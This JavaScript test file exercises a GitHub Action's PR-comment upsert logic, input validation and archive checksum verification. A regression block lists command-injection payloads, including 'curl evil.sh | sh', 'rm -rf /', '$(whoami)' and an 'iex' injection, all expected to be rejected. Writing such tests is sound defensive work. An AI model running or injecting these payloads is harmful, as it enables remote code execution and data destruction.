"use strict";

const assert = require("assert");
const crypto = require("crypto");
const fs = require("fs");
const path = require("path");
const {
  MARKER,
  findExistingCommentId,
  resolvePullRequestNumber,
  upsertPrComment,
} = require("./comment-pr");
const { validateActionInputs } = require("./validate-inputs");
const {
  validateVersionTag,
  verifyArchiveChecksum,
} = require("../../npm/bin/arc");

async function run() {
  assert.strictEqual(resolvePullRequestNumber({ pull_request: { number: 42 } }), 42);
  assert.strictEqual(resolvePullRequestNumber({}), null);

  assert.strictEqual(
    findExistingCommentId([
      { id: 1, body: "unrelated" },
      { id: 99, body: `${MARKER}\n## report` },
    ]),
    99
  );
  assert.strictEqual(findExistingCommentId([{ id: 1, body: "other" }]), null);

  // Test update path when existing comment is found
  let calls = [];
  const resUpdate = await upsertPrComment({
    token: "tok",
    repo: "org/repo",
    prNumber: 7,
    markdown: `${MARKER}\nupdated`,
    requestFn: async (method, pathUrl, _tok, body) => {
      calls.push({ method, path: pathUrl, body });
      if (method === "GET") {
        return { status: 200, body: [{ id: 55, body: `${MARKER}\nold` }] };
      }
      return { status: 200, body: { id: 55 } };
    },
  });
  assert.strictEqual(resUpdate.updated, true);
  assert.strictEqual(calls[1].method, "PATCH");
  assert.strictEqual(calls[1].path, "/repos/org/repo/issues/comments/55");

  // Test create path when no existing comment is found
  calls = [];
  const resCreate = await upsertPrComment({
    token: "tok",
    repo: "org/repo",
    prNumber: 8,
    markdown: `${MARKER}\nnew`,
    requestFn: async (method, pathUrl, _tok, body) => {
      calls.push({ method, path: pathUrl, body });
      if (method === "GET") return { status: 200, body: [] };
      return { status: 201, body: { id: 101 } };
    },
  });
  assert.strictEqual(resCreate.created, true);
  assert.strictEqual(calls[1].method, "POST");
  assert.strictEqual(calls[1].path, "/repos/org/repo/issues/8/comments");

  // ── Phase 0: Action Input Validation & Injection Regression Tests ──────────
  assert.strictEqual(
    validateActionInputs({
      INPUT_VERSION: "v1.2.4",
      INPUT_FAIL_ON: "high",
      INPUT_FAIL_ON_SECRETS: "true",
      INPUT_RUN_SCA: "false",
      INPUT_RUN_POLICY_TEST: "true",
      INPUT_COMMENT_PR: "true",
      INPUT_PATH: "./crates/arc-cli",
    }),
    true
  );

  const adversarialPayloads = [
    { INPUT_VERSION: "v1.2.4; curl evil.sh | sh" },
    { INPUT_VERSION: "$(whoami)" },
    { INPUT_FAIL_ON: 'high" && id #' },
    { INPUT_FAIL_ON_SECRETS: "true; rm -rf /" },
    { INPUT_RUN_SCA: "`id`" },
    { INPUT_PATH: "foo\nbar" },
  ];
  for (const bad of adversarialPayloads) {
    assert.throws(
      () => validateActionInputs(bad),
      /Invalid/,
      `Expected adversarial input to fail validation: ${JSON.stringify(bad)}`
    );
  }

  // Verify action.yml never interpolates ${{ inputs.* }} inside any `run:` block
  const actionYml = fs.readFileSync(
    path.join(__dirname, "..", "..", "action.yml"),
    "utf8"
  );
  const runBlocks = actionYml.split(/\n\s*run:\s*\|/);
  for (let i = 1; i < runBlocks.length; i++) {
    const block = runBlocks[i].split(/\n\s*- name:/)[0];
    assert.strictEqual(
      /\$\{\{\s*inputs\./.test(block),
      false,
      "action.yml must not interpolate ${{ inputs.* }} directly inside a run: block"
    );
  }

  // ── Phase 0: Artifact Integrity Fail-Closed Regression Tests ───────────────
  assert.strictEqual(validateVersionTag("v1.2.4"), "v1.2.4");
  assert.throws(() => validateVersionTag("v1.2.4' ; iex 'evil'"), /Invalid/);
  assert.throws(() => validateVersionTag("../v1.2.4"), /Invalid/);

  const sampleBuf = Buffer.from("vexa-arc-release-archive-bytes", "utf8");
  const sampleSha = crypto.createHash("sha256").update(sampleBuf).digest("hex");
  const archiveName = "vexa-arc-v1.2.4-linux-x86_64.zip";

  assert.strictEqual(
    verifyArchiveChecksum(
      archiveName,
      sampleBuf,
      `# SHA-256 Digests\n${sampleSha}  ${archiveName}\n`
    ),
    sampleSha
  );

  // Missing checksum entry must fail closed
  assert.throws(
    () =>
      verifyArchiveChecksum(
        archiveName,
        sampleBuf,
        `# SHA-256 Digests\n${sampleSha}  other-file.zip\n`
      ),
    /No valid SHA-256 checksum entry/
  );

  // Empty checksums.txt must fail closed
  assert.throws(
    () => verifyArchiveChecksum(archiveName, sampleBuf, ""),
    /Missing or empty checksums\.txt/
  );

  // Tampered archive bytes must fail closed
  assert.throws(
    () =>
      verifyArchiveChecksum(
        archiveName,
        Buffer.from("tampered-bytes", "utf8"),
        `${sampleSha}  ${archiveName}\n`
      ),
    /SHA-256 mismatch/
  );

  console.log("comment-pr.test.js: all assertions (including Phase 0 security gates) passed");
}

run().catch((err) => {
  console.error(err);
  process.exit(1);
});
